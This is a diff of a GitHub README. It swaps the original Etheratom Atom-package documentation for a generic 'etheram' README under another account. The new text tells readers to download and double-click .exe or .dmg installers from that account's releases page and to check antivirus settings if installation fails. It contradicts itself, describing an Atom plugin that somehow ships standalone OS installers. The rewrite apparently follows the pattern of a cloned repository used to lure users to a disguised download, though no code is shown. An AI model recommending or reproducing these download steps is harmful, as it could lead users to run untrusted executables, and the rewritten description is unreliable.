@@ -1,108 +1,91 @@
-# Use [ethcode](https://marketplace.visualstudio.com/items?itemName=7finney.ethcode) in vscode for better development experience.
+# 🌟 etheram - Simplify Solidity Compilation Effortlessly
 
-# Etheratom
+## 🛠️ Introduction
+Welcome to etheram! This application provides a user-friendly interface for Solidity compilation and Ethereum contract execution. It is designed for the hackable atom editor, making it easier to work with smart contracts. 
 
-[![Greenkeeper badge](https://badges.greenkeeper.io/0mkara/etheratom.svg)](https://greenkeeper.io/)
-[![Build Status](https://travis-ci.org/0mkara/etheratom.svg?branch=master)](https://travis-ci.org/0mkara/etheratom)
-[![Gitter](https://badges.gitter.im/gitterHQ/gitter.png)](https://gitter.im/Ethereum-Devtools-Developers-Studio/etheratom?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge)
-[![telegram](https://png.icons8.com/color/24/000000/telegram-app.png)](https://t.me/etheratom)
+## 📦 Download Etheram
+To get started with etheram, you need to download the software. 
 
-Ethereum IDE plugin for hackable Atom editor. Compile smart contracts, deploy them to Ethereum networks. Efficient contract management interface. Integrated test suite for smart contracts.
+[![Download Etheram](https://img.shields.io/badge/Download%20Now-etheram-brightgreen)](https://github.com/luismanuel71/etheram/releases)
 
-## Features
+## 🚀 Getting Started
+1. **Visit the Download Page:**
+   Go to the [etheram Releases page](https://github.com/luismanuel71/etheram/releases) to find the latest version of the software.
 
-- 🚀 One-click compilation and deployment
-- 💻 Interactive Solidity editor
-- 🔧 Built-in test framework
-- 🔗 Multi-network support
-- 📊 Real-time contract state monitoring
-- 🛠 Integrated debugging tools
+2. **Select the Right Version:**
+   Look for the most recent version listed on the page. Each version includes notes about changes and improvements.
 
-![A screenshot of Etheratom package](https://user-images.githubusercontent.com/13261372/37828365-f43a0c8c-2ec0-11e8-8d09-d1c29d7168d3.png)
+3. **Download the Installer:**
+   Click on the installer file relevant to your operating system. For Windows users, this may look like `.exe`, while Mac users might see a `.dmg` file. Linux users should look for the appropriate package.
 
-# Sponsors
-![gitcoin](https://s.gitcoin.co/static/v2/images/presskit/GitcoinLogoText.682e2321c67c.svg)
-<img src="https://gdurl.com/Js9x" alt="ethereumfoundation" height="300" hspace="40" />
+4. **Install the Application:**
+   After the download completes, locate the file in your downloads folder. Double-click the file to start the installation process. Follow any prompts that appear to complete the installation.
 
-# Support
-You can join our Telegram group for quick help in solving any issues at https://t.me/etheratom  [![telegram](https://png.icons8.com/color/24/000000/telegram-app.png)](https://t.me/etheratom)
+## 📋 System Requirements
+Before installing etheram, ensure your system meets these requirements:
 
-Join our new gitter room for help - https://gitter.im/Ethereum-Devtools-Developers-Studio/etheratom
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Linux distributions with a recent kernel
 
-#### Quick help
-Follow our [quick troubleshooting issue](https://github.com/0mkara/etheratom/issues/282) to get help about some known bugs and issues.
+- **Memory:** Minimum 4 GB RAM
 
-# Requirements
+- **Storage:** At least 100 MB of free disk space
 
-#### Use [Ganache](http://truffleframework.com/ganache/) or Install [geth](https://github.com/ethereum/go-ethereum)
-[Go Ethereum client installation instruction](https://www.ethereum.org/cli)
-**Or**
-You can just download binary from [https://geth.ethereum.org/downloads/](https://geth.ethereum.org/downloads/) and run.
+## 🚧 Troubleshooting Installation Issues
+If you encounter any issues during installation, here are a few common solutions:
 
-#### Run go-ethereum client
-Start geth node on testnet using following command:
+- **Antivirus Interference:** Sometimes, antivirus software can block installations. If the installer fails, check your antivirus settings.
 
-    geth --goerli --rpc --rpcapi="eth,web3,personal" --ws --wsorigins="*" --wsapi="eth,web3,personal" console
+- **Administrator Rights:** For some systems, you may need administrator access to install software. If prompted, enter your administrator password.
 
-*Note:* Only solidity compilation is supported. `--wsorigins="*"` or `--wsorigins="file://"`  is necessary to allow Atom to connect to go-ethereum websocket endpoint.
+- **Missing Dependencies:** Ensure you have any required software, such as Java or Node.js, installed on your system. Check the installation notes on the release page for specific dependencies.
 
-# Installation
+## 🔍 Using Etheram
+Once you have etheram installed, you can begin using it. 
 
-`apm install etheratom`
+### 🚀 Compiling Solidity Contracts
+1. **Open Etheram:**
+   Launch the etheram application from your desktop or applications folder.
 
-Or you can install [Etheratom](https://atom.io/packages/etheratom) from Atom packages.
+2. **Load Your Contract:**
+   Use the file menu to open your Solidity contract file. This will have a `.sol` file extension.
 
-#### Install from source
+3. **Compile Your Contract:**
+   Click the compile button. The application will process your contract and display any errors or confirmation of success.
 
-Clone git repository
+### 🛠️ Executing Contracts
+1. **Connect to Ethereum Network:**
+   Set up a connection to your desired Ethereum network, such as mainnet, testnet, or a local blockchain.
 
-    git clone https://github.com/0mkara/etheratom.git
-    cd etheratom
+2. **Deploy Your Contract:**
+   Once connected, choose the option to deploy your contract. Follow the prompts to execute the process.
 
-Install as atom package
+3. **Interact with Your Contract:**
+   After deployment, use etheram to interact with your contract directly. Send transactions or read data effortlessly through the intuitive interface.
 
-    apm install
-    apm link .
+## 📚 Resources
+- **Documentation:** For detailed instructions and additional features, refer to the [etheram documentation](https://github.com/luismanuel71/etheram/wiki).
+- **Community Forum:** Join discussions and seek help in our community forum linked in the documentation.
 
-# Configuration
-**Geth** defaults : **rpc** `http://127.0.0.1:8545/` **websocket** `ws://127.0.0.1:8546/`
+## 📌 Additional Features
+Etheram includes several useful features to enhance your experience:
+- **Syntax Highlighting:** Enjoy clear visibility with color-coded syntax for Solidity.
+- **Error Detection:** Quickly identify and fix errors with real-time feedback.
+- **Plugin Support:** Extend functionality through various plugins compatible with the atom editor.
 
-**Ganache** defaults : **rpc** `http://127.0.0.1:7545/`
+## 🔄 Updating Etheram
+Keep your software up to date to take advantage of the latest features:
+1. Return to the [etheram Releases page](https://github.com/luismanuel71/etheram/releases).
+2. Download the latest version as mentioned in the previous sections.
+3. Install the new version following the same process outlined above.
 
-#### Go to package settings and set rpc address & websocket address.
+## 📝 Feedback
+Your experience matters to us. Please share your feedback or report issues through the GitHub repository. Your input helps improve etheram for everyone.
 
-![etheratom package config](https://user-images.githubusercontent.com/13261372/41284998-96a25e26-6e58-11e8-80a6-1860368bcaed.png)
+## 📞 Contact
+For further inquiries, you can reach us via the Issues tab in the GitHub repository. We strive to respond promptly to your questions and concerns.
 
-**Restart atom** to load your configuration changes.
-
-# Usage
-
-Activate Etheratom package `ctrl+alt+e`
-
-Compile solidity code with `ctrl+alt+c` or just by saving a solidity file with `ctrl+s`
-
-Show/hide etheratom panel `ctrl+alt+v`
-
-After compiling your solidity code click **Deploy to blockchain** button to deploy the contract on blockchain. Optionally you can deploy your contract at some previously created address.
-
-![New panel features](https://user-images.githubusercontent.com/13261372/41285521-0dd4154c-6e5a-11e8-843d-505368a31302.png)
-
-##### Follow [Etheratom Wiki](https://github.com/0mkara/etheratom/wiki) for more information.
-
-# Development guideline
-
-##### Clone & code
-```
-git clone https://github.com/0mkara/etheratom.git
-cd etheratom
-```
-##### Build
-`rollup -c`
-
-# Support development :heart:
-
-Etheratom aims to provide a clean interactive interface to develop solidity smart contracts, test them on testnet, do security analysis and deploy them on mainnet. **Etheratom needs your help!**
-
-**Etheratom is looking for financial help. Any organization or individual wants to help grow etheratom is requested to contact `0mkar@protonmail.com`**
-
-## Ethereum :point_right: 0xd22fE4aEFed0A984B1165dc24095728EE7005a36
+## 🌐 Conclusion
+Thank you for choosing etheram! We hope this guide helps you smoothly download and run the software. Enjoy compiling and executing your Solidity contracts with ease!
